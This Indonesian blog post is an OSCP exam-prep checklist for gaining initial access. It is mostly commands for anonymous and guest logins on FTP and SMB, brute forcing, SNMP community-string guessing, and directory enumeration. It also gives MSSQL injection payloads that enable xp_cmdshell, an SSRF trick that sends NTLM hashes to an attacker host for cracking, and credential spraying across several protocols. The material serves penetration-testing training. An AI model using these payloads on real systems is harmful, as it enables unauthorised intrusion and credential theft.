---
title: "[OSCP] Initial Access - Checklist That Guarantees You to Pwn 'Em All"
author: "novran"
date: 2024-11-27 00:00:00 +0700
categories: ["OSCP Challenge"]
tags: ["Windows Pentest", "Linux Pentest", "FTP Pentest", "SMB Pentest", "Web Pentest", "SNMP Pentest", "OSCP Challenge"]
mermaid: true
image:
  path: /images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all.png
---

Pada tanggal 10 Desember 2024 kemarin, saya memantapkan diri untuk mengambil ujian OSCP. Bisa dibilang agak mendadak, karena Course dan Challenge Lab saya baru jalan sekitar 50%-an. OSCP ini bisa dibilang sebagai "Enumeration Game" yang di mana untuk menemukan Initial Access saat ujian berlangsung tidaklah terlalu sulit.

Saya akan merangkum tantangan-tantangan yang mungkin kalian temui saat mencari Initial Access (saat exam OSCP nanti).

- [X] [**FTP (21/tcp): Anonymous Login**](#ftp-anonymous-login)
- [X] [**FTP (21/tcp): Brute Force Login with ftp-betterdefaultpasslist.txt**](#ftp-brute-force-login-with-ftp-betterdefaultpasslisttxt)
- [X] [**SMB (445/tcp): Null Session Login**](#smb-null-session)
- [X] [**SMB (445/tcp): Guest Login**](#smb-guest-login)
- [X] [**SNMP (161/udp): Public Community Strings**](#snmp-public-community-string)
- [X] [**SNMP (161/udp): Brute Force Community Strings**](#snmp-public-community-string)
- [X] [**Web Application (HTTP): Hidden Directories and Files Enumeration**](#web-application-http-hidden-directories-and-files-enumeration)
- [X] [**Web Application (HTTP): SQL Injection (MSSQL to Command Execution)**](#web-application-sql-injection-mssql-to-command-execution)
- [X] [**Web Application (HTTP): Server-Side Request Forgery in Windows Server (SSRF to Steal NTLM)**](#web-application-server-side-request-forgery-in-windows-server-steal-ntlm)
- [X] [**Web Application (HTTP): Underrated CMS, Framework, or Application Exploit**](#web-application-underrated-cms-framework-or-application-exploit)
- [X] [**Web Application (HTTP): Login Required**](#web-application-login-required)
- [X] [**Uncommon Port and Unknown Service**](#uncommon-port-and-unknown-service)
- [X] [**Gather Username List via Gathered File Attribute (exiftool)**](#gather-username-list-via-gathered-file-attribute-exiftool)
- [X] [**Credential Spraying Technique - FTP, SSH, SMB, WinRM, and RDP**](#credential-spraying---ftp-ssh-smb-winrm-and-rdp)

## Port Scan

Untuk melakukan inisiasi, biasanya kita perlu melakukan Port Scanning di awal. Namun, dalam kasus ini, saya menyarankan untuk tidak menggunakan NMAP (disclaimer: jika tidak terlalu dibutuhkan) karena waktu yang tersedia saat ujian OSCP berlangsung sangat terbatas.

Saat melakukan pengujian dengan beberapa tools, pilihan saya jatuh pada tools berikut:
- [RustScan](https://github.com/RustScan/RustScan) (untuk scan port TCP dengan sangat cepat)
- [UDPX](https://github.com/nullt3r/udpx) (untuk scan port UDP dengan cepat)

TCP:
```bash
rustscan --scripts none -a $TARGET
```

UDP:
```bash
udpx -c 500 -w 1000 -t $TARGET
```

----------

## FTP Anonymous Login

Tool yang akan saya gunakan di sini adalah [NetExec](https://github.com/Pennyw0rth/NetExec).

Skenario yang dapat kita lakukan saat mendapatkan akses FTP Anonymous Login:
- Read-only: Penyerang dapat mengunduh file sensitif, seperti konfigurasi (.env, .conf), file backup (.sql, .zip), atau kredensial (.db, .pdf, .txt).
- Write access: Kita dapat mengunggah file backdoor, untuk mendapatkan akses reverse shell.

```bash
netexec ftp <TARGET> -u 'anonymous' -p 'anonymous'
```

## FTP Brute Force Login with ftp-betterdefaultpasslist.txt

Selain itu, pada service FTP, kita dapat memanfaatkan tool [Hydra](https://www.kali.org/tools/hydra/) dan wordlist dari [ftp-betterdefaultpasslist.txt (SecLists)](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt) untuk menemukan kredensial yang valid.

```bash
hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <TARGET> ftp
```

> Dump all files inside FTP

Untuk catatan tambahan jika menemukan banyak file di dalam FTP-nya, kalian bisa men-download semua filenya sekaligus secara recursive menggunakan command di bawah ini:

```bash
wget -m --user='<USERNAME>' --password='<PASSWORD>' ftp://<TARGET> --no-passive-ftp
```

----------

## SMB Null Session

Untuk memeriksa apakah SMB dapat Login menggunakan Null Session (tanpa username dan password), di sini saya akan menggunakan tool [NetExec](https://github.com/Pennyw0rth/NetExec) (lagi).

```bash
netexec smb <TARGET> -u '' -p ''
```

## SMB Guest Login

Jika tidak dapat login dengan Null Session, kita perlu memeriksa apakah service SMB pada mesin target mengizinkan kita login menggunakan akun Guest.

```bash
netexec smb <TARGET> -u 'guest' -p 'guest'
```

> Enum4linux

Jika salah satu metode login SMB di atas ada yang berhasil, maka kita dapat menggunakan tool [enum4linux](https://www.kali.org/tools/enum4linux/) untuk mempercepat proses enumerasi.

```bash
enum4linux -a -v $TARGET
```
```bash
enum4linux -u 'guest' -p 'guest' -a -v <TARGET>
```
```bash
enum4linux -u 'username' -p 'password' -a -v <TARGET>
```

![enum4linux SMB Users Enumeration](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-enum4linux-smb-users-enum.png)

> Dump all files inside SMB

Jika menemukan Sharefolder yang mencurigakan, kita bisa langsung download semua file di dalam SMB secara recursive ke mesin kita.

```bash
netexec smb <TARGET> -u 'username' -p 'password' -M spider_plus -o DOWNLOAD_FLAG=True
```

----------

**SNMP (161/udp) Pentest Preparation**

Tool yang akan digunakan adalah [net-snmp (snmpbulkwalk)](https://www.kali.org/tools/net-snmp/#snmp) beserta beberapa modul dan tool tambahan lainnya.

```bash
# Install SNMP Extender
sudo apt-get install snmp-mibs-downloader -y
sudo download-mibs
```

```bash
# Install onesixtyone to brute force SNMP
sudo apt update
sudo apt install build-essential libpcap-dev
git clone https://github.com/trailofbits/onesixtyone.git
cd onesixtyone
make
sudo make install
```

## SNMP Public Community String

Initial Access pada SNMP biasanya dilakukan untuk memperoleh kredensial yang tercatat di dalamnya (logging). Dalam SNMP, kita akan menggunakan community string sebagai inputnya.

```bash
snmpbulkwalk -c public -v2c <TARGET> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

- `-c public` adalah `public` community string.

![SNMPBulkWalk Public](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-snmpblukwalk-public.png)

## SNMP Community String Brute Force

Jika community string "public"-nya tidak tersedia, maka kita perlu melakukan brute force pada community string-nya terlebih dahulu untuk menemukannya.

Terdapat dua wordlist yang umum digunakan, yaitu SecLists atau Wordlist dari Metasploit Framework.

```bash
onesixtyone -c /usr/share/SecLists/Discovery/SNMP/snmp.txt <TARGET>
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <TARGET>
```

Kemudian, snmpbulkwalk menggunakan custom community string.

```bash
snmpbulkwalk -c <COMMUNITY_STRING_NAME> -v2c <TARGET> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

----------

## Web Application (HTTP): Hidden Directories and Files Enumeration

Pasti hal ini sudah umum di telinga kalian, karena enumerasi untuk menemukan directory and file sensitif ini adalah hal yang basic.

> Tapi, apakah kita perlu menggunakan 2 wordlist?
> 
> Ya! Saya pernah mengalami stuck dan tidak menemukan apa-apa saat hanya menggunakan satu wordlist. Namun, dengan menggunakan wordlist dari **SecLists** dan **Dirsearch**, menurut saya itu sudah lebih dari cukup untuk membantu menyelesaikan ujian OSCP.

Yang pertama, saya menggunakan tool [Feroxbuster](https://github.com/epi052/feroxbuster) dan Wordlist [SecLists (directory-list-2.3-medium.txt)](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-medium.txt) agar hasilnya cepat dan maksimal (deep).

```bash
feroxbuster -C 404 --auto-tune -k --wordlist /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --threads 100 --depth 2 -u <TARGET>
```

Yang kedua, saya menggunakan [Dirsearch](https://github.com/maurosoria/dirsearch) untuk menemukan directory dan file umum, seperti .env, .git, dan lainnya.

```bash
PYTHONWARNINGS="ignore" python3 ~/dirsearch/dirsearch.py -u <TARGET>
```

## Web Application: SQL Injection (MSSQL to Command Execution)

Pada dasarnya SQL Injection pada MSSQL memungkinkan kita untuk mengeksekusi Stacked Query, yang di mana kita dapat melakukan escape dengan cara menutup dan mengakhiri querynya dengan payload `';` dan menjalankan query lain.

- `http://10.10.10.10/profile.aspx?id=1';EXEC xp_cmdshell "whoami";--`

Enable `xp_cmdshell`:

```sql
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--
```

Execute `xp_cmdshell`"

```
';EXEC xp_cmdshell "whoami";--
```

## Web Application: Server-Side Request Forgery in Windows Server (Steal NTLM)

Saya baru menyadari bahwa, celah SSRF (Server-Side Request Forgery) sangat berbahaya pada environment Windows. Yang di mana dapat dimanfaatkan untuk mencuri NTML Hash.

Untuk mengeksekusinya, kita perlu menghidupkan [Responder](https://github.com/SpiderLabs/Responder) terlebih dahulu pada mesin kita.

```bash
sudo python3 Responder.py -I tun0 -wd
```

Kemudian mengeksekusi SSRF-nya dengan menggunakan URL `file://<ATTACKER_IP>/test` dan boom! Responder kalian akan menangkap Request seperti ini.

![SSRF in Responder](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-ssrf-responder.png)

Lalu, kalian hanya tinggal crack NTML-nya saja.

```bash
hashcat -m 5600 '<HASH>' /usr/share/wordlists/rockyou.txt
```

![SSRF NTLM Cracked](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-ssrf-responder-ntlm-cracked.png)

## Web Application: Underrated CMS, Framework, or Application Exploit

Tak jarang kita menemukan CMS atau Application yang tidak umum bahkan tidak pernah kita lihat sama sekalu sebelumnya.

- Solusinya simple, yaitu buka Google dan search dengan keyword `<APPLICATION_NAME> exploit`

![Web Application: Underrated CMS, Framework, or Application Exploit](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-web-cms-public-exploit.jpeg)

## Web Application: Login Required

Jika kalian menemukan hal seperti ini, ada beberapa checklist yang perlu kalian lakukan

- [ ] Login dengan payload SQL Injection `' OR 1=1 LIMIT 1 -- - `
- [ ] Apakah ada Public Exploit yang bisa kalian manfaatkan untuk Log In?
- [ ] Cari Default Credential-nya di Internet. OffSec sering menggunakan pattern `admin:admin` atau `user:user` (sesuaikan usernya dengan user yang sudah kalian peroleh).

![Web Application Login Required](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-web-default-credential.png)

----------

## Uncommon Port and Unknown Service

Tak jarang juga kita menemukan port yang tidak umum seperti 1978, 3001, dan lain-lain. Apalagi port tersebut bukanlah layanan HTTP, dan sialnya NMAP tidak dapat mendeteksi apa layanan di belakangnya.

Maka solusinya, kita dapat langsung ke Google dan cari menggunakan keyword `port XXX exploit`

![Uncommon Port and Unknown Service](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-uncommon-port-and-service.jpeg)

----------

## Gather Username List via Gathered File Attribute (exiftool)

Agar tidak kaget saat merasa semua upaya Initial Access yang telah dilakukan sia-sia, tetapi kalian menemukan banyak file "sampah". Kalian dapat memeriksa filenya apakah tersimpan attribute penting atau tidak, dengan menggunakan `exiftool`.

```bash
exiftool <FILENAME>
```

Mencari author file secara recursive:

```bash
find . -type f | xargs -I {} exiftool {} | grep ^'Author'
```

![Gather Username List via Gathered File Attribute](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-exiftool-xargs-author.png)

Jika sudah dapat, kalian bisa langsung coba untuk Credential Spray ke setiap Service dan Application dengan pattern login `user:user`.

----------

## Credential Spraying - FTP, SSH, SMB, WinRM, and RDP

Kita ketemu lagi sama [NetExec](https://github.com/Pennyw0rth/NetExec), menggunakan tool sakti ini kita dapat melakukan _Credential Spraying_ ke berbagai macam Service dan Protocol, dengan berbagai macam metode penempatan username dan password.

```bash
# Multiple Usernames and Multiple Passwords
netexec rdp <TARGET> -u username.txt -p password.txt

# Single Username with Multiple Passwords
netexec rdp <TARGET> -u 'john.doe' -p password.txt

# Multiple Usernames with Single Password
netexec rdp <TARGET> -u username.txt -p 'P@ssw0rd123'
```

Maka tinggal sesuaikan saja protokol apa yang digunakan di mesin target.

```bash
netexec ftp <TARGET> -u username.txt -p password.txt
netexec ssh <TARGET> -u username.txt -p password.txt
netexec smb <TARGET> -u username.txt -p password.txt
netexec winrm <TARGET> -u username.txt -p password.txt
netexec rdp <TARGET> -u username.txt -p password.txt
```

Bukan hanya itu, berikut ini list Protocol yang dapat kalian manfaatkan:
- `mssql`
- `smb`
- `ftp`
- `ldap` 
- `nfs`
- `rdp`
- `ssh`
- `vnc`
- `winrm`
- `wmi`





# THE ARTICLE STILL UPDATING...





- Crack the Protected File (PDF, ZIP, etc)
- Some Files (PDF, ZIP, etc) Might Contain Credentials
